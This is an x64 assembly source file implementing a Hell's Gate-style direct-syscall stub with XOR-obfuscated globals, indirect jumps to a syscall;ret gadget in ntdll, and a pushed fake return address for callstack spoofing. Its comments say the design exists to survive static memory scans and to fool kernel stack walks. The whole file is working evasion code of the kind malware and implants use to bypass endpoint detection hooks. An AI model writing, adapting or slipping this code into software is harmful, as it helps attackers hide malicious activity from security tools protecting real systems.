.intel_syntax noprefix

//--------------------------------------------------------> DATA (XOR-OBFUSCATED GLOBALS)
// hells_gate XOR-encodes the real SSN, gadget address, and fake return into these;
// hell_descent XOR-decodes them at dispatch time. the real values are never
// present in plaintext — surviving a static memory scan.
// 0xDEADBEEF is the live obfuscation mask, not a placeholder.

.data
  wSystemCallEnc: .long 0
  qSyscallInsAddressEnc: .quad 0
  qFakeReturnEnc: .quad 0
  wMask: .long 0xDEADBEEF
  qMask: .quad 0xDEADBEEFDEADBEEF

//--------------------------------------------------------> HELLS_GATE (XOR-ENCODE)
// Encodes SSN (ecx), gadget address (rdx), and fake return (r8) via XOR with
// 0xDEADBEEF mask into the data globals. Called once per syscall by syscall_dispatch.

.text
.global hells_gate
.global hell_descent

hells_gate:
  xor ecx, dword ptr [rip + wMask]
  mov dword ptr [rip + wSystemCallEnc], ecx
  xor rdx, qword ptr [rip + qMask]
  mov qword ptr [rip + qSyscallInsAddressEnc], rdx
  mov rax, r8
  xor rax, qword ptr [rip + qMask]
  mov qword ptr [rip + qFakeReturnEnc], rax
  ret

//--------------------------------------------------------> HELL_DESCENT (XOR-DECODE + DISPATCH)
// XOR-decodes the masked globals, sets up x64 syscall args (RCX→R10),
// pushes a fake return from ntdll .text for callstack spoofing, then
// jmps into the random syscall;ret gadget in ntdll.
//
// push r9 gating: fake is non-zero only when arg_count < 5 (set in
// syscall_dispatch). when args < 5, the syscall reads NO stack-passed
// arguments, so the push can't misalign them. when args >= 5, fake = 0
// and no push occurs — stack args stay intact. the push only ever
// happens when it's safe. after syscall;ret, execution returns to the
// pushed ntdll address, so the kernel stack walk sees ntdll frames.

hell_descent:
  mov r10, rcx                                             // RCX → R10 (x64 syscall convention: kernel reads arg1 from R10)
  mov eax, dword ptr [rip + wSystemCallEnc]                // load masked SSN
  xor eax, dword ptr [rip + wMask]                         // unmask → real SSN in EAX
  mov r11, qword ptr [rip + qSyscallInsAddressEnc]         // load masked gadget address
  xor r11, qword ptr [rip + qMask]                         // unmask → real gadget address in R11

  mov rcx, r9                                              // save arg4 (RCX free after mov r10, rcx above)
  mov r9, qword ptr [rip + qFakeReturnEnc]                 // load masked fake return
  xor r9, qword ptr [rip + qMask]                          // unmask
  test r9, r9
  jz   .Ldone
  push r9                                                  // push fake return onto stack (only when safe — see header)
.Ldone:
  mov r9, rcx                                              // restore arg4
  mov rcx, r10                                             // restore arg1 into RCX
  jmp r11                                                  // → random syscall;ret gadget in ntdll
